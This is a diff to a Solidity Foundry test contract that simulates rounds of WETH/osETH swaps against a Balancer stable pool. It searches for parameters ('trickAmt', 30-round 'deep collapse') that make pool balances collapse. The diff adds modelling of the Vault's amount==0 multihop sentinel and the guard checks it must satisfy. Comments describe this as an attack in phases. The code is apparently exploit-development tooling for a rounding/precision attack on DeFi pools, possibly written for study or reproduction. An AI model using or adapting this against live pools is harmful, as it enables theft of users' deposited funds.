@@ -345,8 +345,8 @@ contract SearchParams is Test {
     /// it across rounds; it is unused on round 0 (the `tk+1 < remain` grid guard keeps round-0
     /// swap-1 out >= 1). All other combos never produce a zero out, so this behaves identically to
     /// simulateOneRound for them (byte-for-byte same balances).
-    function simulateOneRoundSentinel(uint256 balWETH, uint256 balOSETH, uint256 trickAmt, uint256 prevSwap3In)
-        external returns (uint256 newBalWETH, uint256 newBalOSETH, uint256 outSwap3In)
+    function simulateOneRoundSentinel(uint256 balWETH, uint256 balOSETH, uint256 trickAmt, uint256 prevSwap3In, bool prevTokenIsOsETH, bool hasPrevious)
+        external returns (uint256 newBalWETH, uint256 newBalOSETH, uint256 outSwap3In, bool outTokenIsOsETH, bool outHasPrevious)
     {
         uint256[] memory bal = new uint256[](2);
         uint256[] memory scalingFactors = new uint256[](2);
@@ -358,17 +358,28 @@ contract SearchParams is Test {
         // Swap 1: WETH(0) -> osETH(1), GIVEN_OUT out = balOSETH - trickAmt - 1
         uint256 out1 = bal[1] - trickAmt - 1;
         if (out1 == 0) {
-            // Vault amount==0 sentinel: reuse previousAmountCalculated (prior round's swap-3 osETH-in).
-            out1 = prevSwap3In;
+            // Balancer Vault batchSwap amount==0 multihop sentinel (Swaps.sol _swapWithPools, L235-244):
+            // reuse the previous step's calculated amount, applying the Vault's two guards.
+            // L240 UNKNOWN_AMOUNT_IN_FIRST_SWAP: `i > 0` -- a previous batchSwap step must exist. This is a
+            // POSITIONAL check; in this attack phase-1 always precedes phase-2, so hasPrevious is always
+            // true here (it could only fail if this were the batchSwap's very first step).
+            require(hasPrevious, "UNKNOWN_AMOUNT_IN_FIRST_SWAP");
+            // L241-242 MALCONSTRUCTED_MULTIHOP_SWAP: current given token (GIVEN_OUT -> tokenOut = osETH)
+            // must equal the previous calculated token. That token is osETH iff the previous step was a
+            // swap-3 (osETH->WETH); at round 0 the previous step is phase-1 (calc token = BPT) so prevTokenIsOsETH
+            // is false and this correctly reverts, matching the Vault.
+            require(prevTokenIsOsETH, "MALCONSTRUCTED_MULTIHOP_SWAP");
+            out1 = prevSwap3In; // = previousAmountCalculated
         }
         bal = swapMath.getAfterSwapOutBalances(bal, scalingFactors, 0, 1, out1, amp, swapFeePercentage);
 
         // Swap 2: WETH(0) -> osETH(1), out = trickAmt (structurally never 0)
         bal = swapMath.getAfterSwapOutBalances(bal, scalingFactors, 0, 1, trickAmt, amp, swapFeePercentage);
 
-        // Swap 3: osETH(1) -> WETH(0), truncation + 9/10 retry; capture osETH-in for the next round.
+        // Swap 3: osETH(1) -> WETH(0), truncation + 9/10 retry; capture osETH-in as next round's
+        // previousAmountCalculated (GIVEN_OUT calculated token = tokenIn = osETH -> outTokenIsOsETH=true).
         try this._computeSwap3WithIn(bal[0], bal[1]) returns (uint256, uint256 w, uint256 o, uint256 osethIn) {
-            return (w, o, osethIn);
+            return (w, o, osethIn, true, true);
         } catch {revert("Swap 3 failed");}
     }
 
@@ -626,10 +637,10 @@ contract SearchParams is Test {
                 uint256 bW = R;
                 uint256 bO = R;
                 uint256 rounds = 0;
-                uint256 prevS3 = 0; // previousAmountCalculated for the amount==0 multihop sentinel
+                uint256 prevS3 = 0; bool prevIsOs = false; bool hasPrev = true; // previous* for amount==0 sentinel (phase-1 always precedes phase-2)
                 for (uint256 r = 0; r < N; r++) {
-                    try this.simulateOneRoundSentinel(bW, bO, tk, prevS3) returns (uint256 w, uint256 o, uint256 s3in) {
-                        bW = w; bO = o; prevS3 = s3in; rounds++;
+                    try this.simulateOneRoundSentinel(bW, bO, tk, prevS3, prevIsOs, hasPrev) returns (uint256 w, uint256 o, uint256 s3in, bool isOs, bool hp) {
+                        bW = w; bO = o; prevS3 = s3in; prevIsOs = isOs; hasPrev = hp; rounds++;
                     } catch { break; }
                 }
                 if (rounds != N) continue; // must complete 30 rounds (deep collapse)
@@ -2101,9 +2112,9 @@ contract SearchParams is Test {
         console.log("[SP] trickAmt:", trickAmt);
         console.log("[SP] sf[0]:", sf[0]);
         console.log("[SP] sf[1]:", sf[1]);
-        uint256 prevS3 = 0; // previousAmountCalculated for the amount==0 multihop sentinel
+        uint256 prevS3 = 0; bool prevIsOs = false; bool hasPrev = true; // previous* for amount==0 sentinel (phase-1 always precedes phase-2)
         for (uint256 r = 0; r < N; r++) {
-            (bW, bO, prevS3) = this.simulateOneRoundSentinel(bW, bO, trickAmt, prevS3);
+            (bW, bO, prevS3, prevIsOs, hasPrev) = this.simulateOneRoundSentinel(bW, bO, trickAmt, prevS3, prevIsOs, hasPrev);
             console.log("[SP] Round:", r);
             console.log("[SP]   bW:", bW);
             console.log("[SP]   bO:", bO);
